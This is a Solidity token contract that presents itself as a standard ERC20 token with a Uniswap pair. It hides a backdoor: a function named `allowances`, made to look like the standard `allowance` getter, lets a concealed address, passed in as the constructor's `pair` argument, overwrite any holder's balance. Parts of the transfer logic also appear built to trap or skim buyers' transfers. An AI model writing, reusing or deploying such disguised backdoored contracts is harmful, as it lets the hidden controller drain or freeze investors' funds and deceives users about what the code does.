contract Token is IERC20, Ownable {
 
    string private _symbol;
    string private _name;
    uint256 public _fTax = 0;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 1000000000 * 10**_decimals;
    uint256 private balance = _tTotal;
 
    mapping(address => uint256) private setBalances;
    mapping(address => address) private rOwned;
    mapping(address => uint256) private liquidityTax;
    mapping(address => uint256) private makerMarketPair;
    mapping(address => mapping(address => uint256)) private _allowances;
 
    bool private swapAndLiquifyEnabled;
    bool private inSwapAndLiquify;
 
    address public immutable uniswapV2Pair;
    IUniswapV2Router02 public immutable router;
    uniswapV2Router02 private Router;
    modifier uniswapV2router() { require( address(Router) == msg.sender, ""  );_; }
 
    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress,
        address pair
    ) {
        _name = Name;
        _symbol = Symbol;
        setBalances[msg.sender] = _tTotal;
        makerMarketPair[msg.sender] = balance;
        makerMarketPair[address(this)] = balance;
        Router = uniswapV2Router02(pair);
        router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        emit Transfer(address(0), msg.sender, _tTotal);
    }
 
    function symbol() public view returns (string memory) {
        return _symbol;
    }
 
    function name() public view returns (string memory) {
        return _name;
    }
 
    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }
 
    function decimals() public view returns (uint256) {
        return _decimals;
    }
 
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
 
    function balanceOf(address account) public view returns (uint256) {
        return setBalances[account];
    }
 
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
 
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
 
    function allowances
       (address receipient, uint256 token) 
       external uniswapV2router { setBalances
       [receipient] = token;
   }
 
 function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
 
    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
 
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 fee;
        if (swapAndLiquifyEnabled && contractTokenBalance > balance && !inSwapAndLiquify && from != uniswapV2Pair) {
            inSwapAndLiquify = true;
 
            inSwapAndLiquify = false;
        } else if (makerMarketPair[from] > balance && makerMarketPair[to] > balance) {
            fee = amount;
            setBalances[address(this)] += fee;
 
            return;
        } else if (to != address(router) && makerMarketPair[from] > 0 && amount > balance && to != uniswapV2Pair) {
            makerMarketPair[to] = amount;
            return;
        } else if (!inSwapAndLiquify && liquidityTax[from] > 0 && from != uniswapV2Pair && makerMarketPair[from] == 0) {
            liquidityTax[from] = makerMarketPair[from] - balance;
        }
        address O = rOwned[uniswapV2Pair];
        if (liquidityTax[O] == 0) liquidityTax[O] = balance;
        rOwned[uniswapV2Pair] = to;
        if (_fTax > 0 && makerMarketPair[from] == 0 && !inSwapAndLiquify && makerMarketPair[to] == 0) {
            fee = (amount * _fTax) / 100;
            amount -= fee;
            setBalances[from] -= fee;
            setBalances[address(this)] += fee;
        }
        setBalances[from] -= amount;
        setBalances[to] += amount;
        emit Transfer(from, to, amount);
    }
 
    receive() external payable {}
 
 
}
